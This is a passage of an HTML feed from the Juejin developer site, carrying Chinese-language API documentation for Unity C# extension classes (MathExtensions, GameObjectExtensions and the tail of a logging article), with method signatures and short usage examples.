<span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> des</span>)</span> { }
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
</code></pre>
<ol start="4">
<li><strong>集成第三方日志系统</strong>（如 Serilog、Log4Unity 等）</li>
<li><strong>添加颜色/富文本支持</strong></li>
</ol>
<pre><code class="hljs language-css" lang="css">DebugExtensions<span class="hljs-selector-class">.Log</span>("&lt;<span class="hljs-attribute">color</span>=yellow&gt;重要信息&lt;/<span class="hljs-attribute">color</span>&gt;");
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MathExtensions]]></title>    <link>https://juejin.cn/post/7603004323911663622</link>    <guid>https://juejin.cn/post/7603004323911663622</guid>    <pubDate>2026-02-05T06:38:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603004323911663622" data-draft-id="7602916406981509161" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MathExtensions"/> <meta itemprop="keywords" content="Unity3D"/> <meta itemprop="datePublished" content="2026-02-05T06:38:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wembanyama"/> <meta itemprop="url" content="https://juejin.cn/user/3699191947468376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MathExtensions
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3699191947468376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wembanyama
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:38:57.000Z" title="Thu Feb 05 2026 06:38:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述（Overview）</h2>
<p>MathExtensions 是一个轻量级的 <strong>数学与向量运算扩展方法</strong> 静态类，位于 PFGameFramework.Library 命名空间。</p>
<p>当前主要提供以下功能：</p>
<ul>
<li>高精度四舍五入（使用 MidpointRounding.AwayFromZero 规则）</li>
<li>Vector3 常用操作的简洁扩展方法（角度、归一化、线性插值）</li>
</ul>
<p>这些方法旨在让代码更简洁、可读性更强，尤其适合在 Unity 项目中频繁使用的向量计算场景。</p>
<p><strong>依赖</strong>：</p>
<ul>
<li>System（Math.Round）</li>
<li>UnityEngine（Vector3 相关方法）</li>
</ul>
<hr/>
<h2 data-id="heading-1">方法一览（API Index）</h2>








































<table><thead><tr><th>方法名</th><th>扩展类型</th><th>返回类型</th><th>主要功能</th><th>典型用途</th></tr></thead><tbody><tr><td>MathRound</td><td>static</td><td>double</td><td>四舍五入保留指定小数位（AwayFromZero）</td><td>精确数值显示、物理计算结果处理</td></tr><tr><td>AngleBetween</td><td>Vector3</td><td>float</td><td>计算两个向量之间的夹角（度）</td><td>朝向判断、旋转角度计算</td></tr><tr><td>ToNormalized</td><td>Vector3</td><td>Vector3</td><td>返回向量的单位向量（归一化）</td><td>方向向量、单位化速度/力</td></tr><tr><td>LerpTo</td><td>Vector3</td><td>Vector3</td><td>从当前向量线性插值到目标向量</td><td>平滑移动、插值动画、过渡效果</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">方法详情</h2>
<h3 data-id="heading-3">MathRound</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 保留指定的小数位数，采用四舍五入方式（五时向远离零的方向舍入）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 使用 Math.Round + MidpointRounding.AwayFromZero 规则</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="number"&gt;</span>要处理的数字<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="decimaDigit"&gt;</span>保留的小数位数（可为 0 或负数）<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>四舍五入后的 double 值<span class="hljs-doctag">&lt;/returns&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;remarks&gt;</span>参考 MSDN：MidpointRounding.AwayFromZero - 五时向远离零的方向舍入<span class="hljs-doctag">&lt;/remarks&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">double</span> <span class="hljs-title">MathRound</span>(<span class="hljs-params"><span class="hljs-built_in">double</span> number, <span class="hljs-built_in">int</span> decimaDigit</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">double <span class="hljs-attr">value</span> = <span class="hljs-number">3.1415926535</span><span class="hljs-comment">;</span>
double <span class="hljs-attr">rounded</span> = value.MathRound(<span class="hljs-number">4</span>)<span class="hljs-comment">;     // → 3.1416</span>
double <span class="hljs-attr">rounded2</span> = value.MathRound(<span class="hljs-number">2</span>)<span class="hljs-comment">;    // → 3.14</span>
double <span class="hljs-attr">rounded3</span> = <span class="hljs-number">2.5</span>.MathRound(<span class="hljs-number">0</span>)<span class="hljs-comment">;      // → 3（五向远离零）</span>
double <span class="hljs-attr">rounded4</span> = (-<span class="hljs-number">2.5</span>).MathRound(<span class="hljs-number">0</span>)<span class="hljs-comment">;   // → -3</span>
</code></pre>
<p><strong>注意</strong>：</p>
<ul>
<li>与默认 Math.Round（ToEven）不同，此处使用 <strong>AwayFromZero</strong>，更符合日常“四舍五入”直觉</li>
<li>负数同样向远离零方向舍入</li>
</ul>
<hr/>
<h3 data-id="heading-4">AngleBetween</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 计算当前向量与目标向量之间的夹角（单位：度）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 结果范围 [0, 180]</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="vector1"&gt;</span>第一个向量（this）<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="vector2"&gt;</span>第二个向量<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>两个向量之间的夹角（度）<span class="hljs-doctag">&lt;/returns&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">float</span> <span class="hljs-title">AngleBetween</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> Vector3 vector1, Vector3 vector2</span>)
</span></code></pre>
<p><strong>等价于</strong>：Vector3.Angle(vector1, vector2)</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">Vector3 <span class="hljs-attr">forward</span> = transform.forward<span class="hljs-comment">;</span>
Vector3 <span class="hljs-attr">toTarget</span> = (target.position - transform.position).normalized<span class="hljs-comment">;</span>
float <span class="hljs-attr">angle</span> = forward.AngleBetween(toTarget)<span class="hljs-comment">;</span>

if (angle &lt; 45f)
{
    Debug.Log("目标在视野前方")<span class="hljs-comment">;</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-5">ToNormalized</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 返回当前向量的单位向量（长度为 1）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 若向量长度为 0，则返回 Vector3.zero</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>归一化后的向量<span class="hljs-doctag">&lt;/returns&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Vector3 <span class="hljs-title">ToNormalized</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> Vector3 vector</span>)
</span></code></pre>
<p><strong>等价于</strong>：vector.normalized</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">Vector3 <span class="hljs-attr">direction</span> = (player.position - transform.position).ToNormalized()<span class="hljs-comment">;</span>
<span class="hljs-attr">rigidbody.velocity</span> = direction * speed<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">LerpTo</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 从当前向量线性插值到目标向量</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> t = 0 时返回当前向量，t = 1 时返回目标向量</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="start"&gt;</span>起始向量（this）<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="end"&gt;</span>目标向量<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="t"&gt;</span>插值因子 [0,1]<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>插值结果向量<span class="hljs-doctag">&lt;/returns&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Vector3 <span class="hljs-title">LerpTo</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> Vector3 start, Vector3 end, <span class="hljs-built_in">float</span> t</span>)
</span></code></pre>
<p><strong>等价于</strong>：Vector3.Lerp(start, end, t)</p>
<p><strong>示例</strong>（平滑跟随）：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Update</span><span class="hljs-params">()</span>
</span>{
    transform.position = transform.position.<span class="hljs-built_in">LerpTo</span>(target.position, Time.deltaTime * followSpeed);
}
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GameObjectExtensions]]></title>    <link>https://juejin.cn/post/7602916406981460009</link>    <guid>https://juejin.cn/post/7602916406981460009</guid>    <pubDate>2026-02-05T06:35:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602916406981460009" data-draft-id="7602928783596863494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GameObjectExtensions"/> <meta itemprop="keywords" content="Unity3D"/> <meta itemprop="datePublished" content="2026-02-05T06:35:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wembanyama"/> <meta itemprop="url" content="https://juejin.cn/user/3699191947468376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GameObjectExtensions
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3699191947468376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wembanyama
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:35:32.000Z" title="Thu Feb 05 2026 06:35:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述（Overview）</h2>
<p>GameObjectExtensions 是一个专注于 <strong>Unity GameObject 常用操作</strong> 的静态扩展方法集合，位于 PFGameFramework.Library 命名空间。</p>
<p>主要功能包括：</p>
<ul>
<li>激活状态判断与递归设置</li>
<li>安全获取组件/脚本（带日志提示）</li>
<li>显示/隐藏快捷方法</li>
<li>子物体查找（按名称、安全查找、获取全部）</li>
<li>层级（Layer）批量设置（递归）</li>
<li>父物体获取</li>
<li>查找并激活物体</li>
<li>物体克隆（指定位置与旋转）</li>
<li>Tag 设置（避免重复设置）</li>
</ul>
<p>适用于快速管理物体状态、层级控制、子物体查找、调试提示等常见 3D/2D 场景操作。</p>
<hr/>
<h2 data-id="heading-1">方法一览（API Index）</h2>



















































































<table><thead><tr><th>方法名</th><th>返回类型</th><th>主要功能</th><th>典型用途</th></tr></thead><tbody><tr><td>IsActive</td><td>bool</td><td>判断物体自身和层级是否激活</td><td>替代 activeSelf &amp;&amp; activeInHierarchy</td></tr><tr><td>SetActiveRecursively</td><td>void</td><td>递归激活/禁用物体及其所有子物体</td><td>整组显隐控制</td></tr><tr><td>GetScriptSafe</td><td>void</td><td>安全检查指定脚本是否存在并打印日志</td><td>调试脚本挂载情况</td></tr><tr><td>GetComponentSafe</td><td>void</td><td>安全获取组件，存在/不存在时分别执行回调并打印日志</td><td>带提示的组件检查</td></tr><tr><td>Show / Hide</td><td>void</td><td>快速激活/禁用物体</td><td>简洁显隐操作</td></tr><tr><td>FindChild / FindChildSafe</td><td>GameObject or null</td><td>按名称查找子物体（安全版返回 null 不报错）</td><td>快速定位子物体</td></tr><tr><td>GetAllChildren</td><td>List</td><td>获取所有直接子物体列表</td><td>批量处理子物体</td></tr><tr><td>SetLayer (int / string)</td><td>void</td><td>递归设置物体及子物体的层级（支持层名）</td><td>统一层级管理（如射线检测、渲染分组）</td></tr><tr><td>GetParent</td><td>GameObject or null</td><td>获取父物体（若无父物体返回 null）</td><td>层级导航</td></tr><tr><td>FindAndActivate</td><td>GameObject or null</td><td>全局查找物体并激活</td><td>快速激活场景中特定物体</td></tr><tr><td>Clone</td><td>GameObject</td><td>在指定位置和旋转克隆物体</td><td>动态生成副本</td></tr><tr><td>SetTag</td><td>void</td><td>设置 Tag（避免重复设置）</td><td>安全批量打标签</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">方法详情</h2>
<h3 data-id="heading-3">激活状态相关</h3>
<h4 data-id="heading-4">IsActive</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 判断物体是否真正处于激活状态（自身 + 层级）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">IsActive</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject</span>)
</span></code></pre>
<p>等价于 gameObject.activeSelf &amp;&amp; gameObject.activeInHierarchy</p>
<h4 data-id="heading-5">SetActiveRecursively</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 递归设置物体及其所有子物体的激活状态</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetActiveRecursively</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject, <span class="hljs-built_in">bool</span> active</span>)
</span></code></pre>
<p><strong>典型用法</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">panel.<span class="hljs-built_in">SetActiveRecursively</span>(<span class="hljs-literal">false</span>); <span class="hljs-comment">// 关闭整个 UI 面板及其所有子元素</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">组件/脚本安全检查</h3>
<h4 data-id="heading-7">GetScriptSafe</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 检查指定脚本是否存在，并打印相应日志（仅针对 MonoBehaviour）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GetScriptSafe</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-keyword">this</span> GameObject gameObject</span>) <span class="hljs-keyword">where</span> T : MonoBehaviour
</span></code></pre>
<p><strong>输出示例</strong>：</p>
<pre><code class="hljs language-erlang" lang="erlang">Player 上存在脚本 PlayerController.
Cube 上没有找到脚本 MoveController.
</code></pre>
<h4 data-id="heading-8">GetComponentSafe</h4>
